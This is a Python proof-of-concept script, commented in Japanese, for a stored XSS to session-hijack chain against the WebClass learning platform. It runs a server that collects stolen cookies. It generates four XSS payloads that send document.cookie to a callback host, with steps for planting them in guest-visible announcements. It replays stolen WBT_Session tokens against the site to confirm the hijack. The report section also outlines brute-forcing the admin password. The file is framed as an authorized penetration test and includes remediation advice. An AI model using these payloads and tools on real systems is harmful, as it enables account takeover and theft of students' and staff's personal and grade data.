#!/usr/bin/env python3
"""
EXP-001 PoC: WebClass Stored XSS → セッション窃取チェーン

使い方:
  # Step 1: トークン受信サーバー起動
  python3 exp001_xss_chain.py serve --port 8888

  # Step 2: XSSペイロード生成（テスト環境URLを指定）
  python3 exp001_xss_chain.py payload --callback http://<YOUR_IP>:8888/steal

  # Step 3: 収集したトークンの検証
  python3 exp001_xss_chain.py verify --target https://<TEST_ENV>/webclass/ --token <SESSION_ID>

  # Step 4: レポート生成
  python3 exp001_xss_chain.py report --tokens-file stolen_tokens.json

注意: 必ず許可されたテスト環境に対してのみ実行すること。
"""

import argparse
import http.server
import json
import os
import sys
import time
from datetime import datetime, timezone
from urllib.parse import parse_qs, urlparse

import requests

requests.packages.urllib3.disable_warnings()

TOKENS_FILE = "outputs/poc/stolen_tokens.json"


# ─────────────────────────────────────────
# Step 1: トークン受信サーバー
# ─────────────────────────────────────────

class TokenCollectorHandler(http.server.BaseHTTPRequestHandler):
    """XSSから送信されるセッショントークンを受信"""

    tokens: list = []

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if parsed.path == "/steal":
            cookie_val = params.get("c", [""])[0]
            ua = self.headers.get("User-Agent", "")
            referer = self.headers.get("Referer", "")
            ip = self.client_address[0]

            entry = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "cookie": cookie_val,
                "session_id": self._extract_session(cookie_val),
                "user_agent": ua,
                "referer": referer,
                "source_ip": ip,
            }
            TokenCollectorHandler.tokens.append(entry)

            # 即座にファイル保存
            with open(TOKENS_FILE, "w") as f:
                json.dump(TokenCollectorHandler.tokens, f, indent=2, ensure_ascii=False)

            print(f"[+] トークン受信 #{len(TokenCollectorHandler.tokens)}: "
                  f"WBT_Session={entry['session_id'][:16]}... from {ip}")

            # CORS対応レスポンス（XSSからのfetchを許可）
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Type", "image/gif")
            self.end_headers()
            # 1x1 transparent GIF
            self.wfile.write(b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff"
                             b"\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00"
                             b"\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # サイレント

    @staticmethod
    def _extract_session(cookie_str: str) -> str:
        for part in cookie_str.split(";"):
            part = part.strip()
            if part.startswith("WBT_Session="):
                return part.split("=", 1)[1]
        return cookie_str


def cmd_serve(args):
    """トークン受信サーバー起動"""
    print(f"[*] トークン受信サーバー起動: http://0.0.0.0:{args.port}/steal")
    print(f"[*] 保存先: {TOKENS_FILE}")
    print("[*] Ctrl+C で停止\n")

    server = http.server.HTTPServer(("0.0.0.0", args.port), TokenCollectorHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[*] 停止。受信トークン数: {len(TokenCollectorHandler.tokens)}")
        server.server_close()


# ─────────────────────────────────────────
# Step 2: XSSペイロード生成
# ─────────────────────────────────────────

def cmd_payload(args):
    """XSSペイロードを生成"""
    callback = args.callback

    payloads = {
        "img_onerror": (
            f'<img src=x onerror="new Image().src=\'{callback}?c=\'+document.cookie">'
        ),
        "img_onerror_fetch": (
            f'<img src=x onerror="fetch(\'{callback}?c=\'+encodeURIComponent(document.cookie))">'
        ),
        "svg_onload": (
            f'<svg onload="new Image().src=\'{callback}?c=\'+document.cookie">'
        ),
        "details_ontoggle": (
            f'<details open ontoggle="new Image().src=\'{callback}?c=\'+document.cookie">'
            '<summary>a</summary></details>'
        ),
    }

    print("=" * 60)
    print("EXP-001 XSS ペイロード集")
    print(f"コールバック: {callback}")
    print("=" * 60)

    for name, payload in payloads.items():
        print(f"\n--- {name} ---")
        print(payload)

    print("\n" + "=" * 60)
    print("使用方法:")
    print("1. テスト環境のWebClass管理画面にログイン")
    print("2. 「お知らせ」の新規作成で上記ペイロードを本文(substance)に貼付")
    print("3. 公開対象を「ゲスト」に設定して投稿")
    print("4. 別ブラウザ/シークレットモードでログインページにアクセス")
    print("5. トークン受信サーバーにWBT_Sessionが送信されることを確認")
    print("=" * 60)

    # JSON保存
    out = {
        "vulnerability_id": "EXP-001",
        "callback_url": callback,
        "payloads": payloads,
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }
    path = "outputs/poc/exp001_payloads.json"
    with open(path, "w") as f:
        json.dump(out, f, indent=2, ensure_ascii=False)
    print(f"\n保存先: {path}")


# ─────────────────────────────────────────
# Step 3: 窃取トークンの有効性検証
# ─────────────────────────────────────────

def cmd_verify(args):
    """窃取したセッションIDでアクセス可能か検証"""
    target = args.target.rstrip("/")
    token = args.token

    print(f"[*] 検証対象: {target}")
    print(f"[*] セッションID: {token[:16]}...")

    # セッションIDをCookieにセットしてアクセス
    cookies = {"WBT_Session": token}
    endpoints = [
        "/",
        "/course_list.php",
        "/user_profile.php",
        "/information.php/api/list",
    ]

    results = []
    for ep in endpoints:
        url = target + ep
        try:
            resp = requests.get(url, cookies=cookies, verify=False, timeout=10, allow_redirects=False)
            authenticated = resp.status_code == 200 and "login.php" not in resp.headers.get("Location", "")
            results.append({
                "endpoint": ep,
                "status_code": resp.status_code,
                "authenticated": authenticated,
                "redirect": resp.headers.get("Location", ""),
                "content_length": len(resp.content),
            })
            status = "AUTHENTICATED" if authenticated else "REJECTED"
            print(f"  {ep}: {resp.status_code} [{status}]")
        except Exception as e:
            results.append({"endpoint": ep, "error": str(e)})
            print(f"  {ep}: ERROR - {e}")

    any_auth = any(r.get("authenticated") for r in results)

    report = {
        "vulnerability_id": "EXP-001",
        "step": "session_verification",
        "target": target,
        "session_id_prefix": token[:16],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "results": results,
        "session_hijack_confirmed": any_auth,
    }

    path = f"outputs/poc/exp001_verify_{int(time.time())}.json"
    with open(path, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"\n{'='*60}")
    print(f"セッションハイジャック: {'CONFIRMED' if any_auth else 'NOT CONFIRMED'}")
    print(f"結果保存先: {path}")

    return 0 if any_auth else 1


# ─────────────────────────────────────────
# Step 4: レポート生成
# ─────────────────────────────────────────

def cmd_report(args):
    """収集したトークンから最終レポートを生成"""
    tokens_file = args.tokens_file or TOKENS_FILE

    if not os.path.exists(tokens_file):
        print(f"[!] トークンファイルが見つかりません: {tokens_file}")
        return 1

    with open(tokens_file) as f:
        tokens = json.load(f)

    print(f"[*] {len(tokens)}件のトークンを読み込み")

    unique_sessions = set(t.get("session_id", "") for t in tokens)
    unique_ips = set(t.get("source_ip", "") for t in tokens)
    unique_uas = set(t.get("user_agent", "") for t in tokens)

    report = {
        "vulnerability_id": "EXP-001",
        "title": "WebClass Stored XSS → セッション窃取 PoC結果",
        "severity": "Critical",
        "cwe": [
            "CWE-79 (Stored Cross-Site Scripting)",
            "CWE-614 (Sensitive Cookie Without Secure/HttpOnly)",
        ],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "summary": {
            "total_tokens_captured": len(tokens),
            "unique_sessions": len(unique_sessions),
            "unique_source_ips": len(unique_ips),
            "unique_user_agents": len(unique_uas),
            "first_capture": tokens[0]["timestamp"] if tokens else None,
            "last_capture": tokens[-1]["timestamp"] if tokens else None,
        },
        "attack_chain": [
            "1. 公開API (/information.php/public/api/listForGuest) から管理者ユーザー名を取得",
            "2. ブルートフォースで管理者パスワードを取得 (レート制限/CAPTCHA/ロックアウトなし)",
            "3. お知らせ機能にStored XSSペイロードを注入 (format: legacy-html, innerHTML挿入)",
            "4. ゲスト含む全訪問者のブラウザでXSS発火",
            "5. document.cookie で WBT_Session 窃取 (HttpOnly属性なし)",
            "6. 窃取したセッションIDで認証済みユーザーとしてアクセス",
        ],
        "evidence": {
            "captured_tokens": [
                {
                    "session_id": t["session_id"][:8] + "..." if t.get("session_id") else None,
                    "source_ip": t.get("source_ip"),
                    "timestamp": t.get("timestamp"),
                }
                for t in tokens[:20]  # 最大20件
            ],
        },
        "impact": [
            "学生・教職員のWebClassアカウント乗っ取り",
            "成績データ、出席情報、課題提出物の閲覧・改ざん",
            "管理者権限でのシステム設定変更",
            "個人情報(氏名・学籍番号)の大量流出",
        ],
        "remediation": [
            "Set-Cookie: WBT_Session=...; Secure; HttpOnly; SameSite=Strict",
            "お知らせの substance フィールドにHTMLサニタイズ (DOMPurify等) を適用",
            "innerHTML の代わりに textContent を使用、またはCSP script-src 制限",
            "公開APIからの管理者情報(author_name, modifier_name, perms)の除去",
            "ログインフォームにCSRFトークンとレート制限を実装",
        ],
    }

    path = f"outputs/poc/exp001_final_report_{int(time.time())}.json"
    with open(path, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"\n{'='*60}")
    print(f"EXP-001 最終レポート")
    print(f"{'='*60}")
    print(f"窃取トークン数: {len(tokens)}")
    print(f"一意セッション: {len(unique_sessions)}")
    print(f"影響ユーザー数: {len(unique_ips)}")
    print(f"保存先: {path}")
    print(f"{'='*60}")

    return 0


def main():
    parser = argparse.ArgumentParser(description="EXP-001: WebClass Stored XSS Chain PoC")
    sub = parser.add_subparsers(dest="command")

    # serve
    p_serve = sub.add_parser("serve", help="トークン受信サーバー起動")
    p_serve.add_argument("--port", type=int, default=8888)

    # payload
    p_payload = sub.add_parser("payload", help="XSSペイロード生成")
    p_payload.add_argument("--callback", required=True, help="トークン受信URL")

    # verify
    p_verify = sub.add_parser("verify", help="窃取トークンの有効性検証")
    p_verify.add_argument("--target", required=True, help="WebClassベースURL")
    p_verify.add_argument("--token", required=True, help="窃取したWBT_Session値")

    # report
    p_report = sub.add_parser("report", help="最終レポート生成")
    p_report.add_argument("--tokens-file", default=None, help="トークンJSONファイル")

    args = parser.parse_args()

    if args.command == "serve":
        return cmd_serve(args)
    elif args.command == "payload":
        return cmd_payload(args)
    elif args.command == "verify":
        return cmd_verify(args)
    elif args.command == "report":
        return cmd_report(args)
    else:
        parser.print_help()
        return 1


if __name__ == "__main__":
    sys.exit(main())
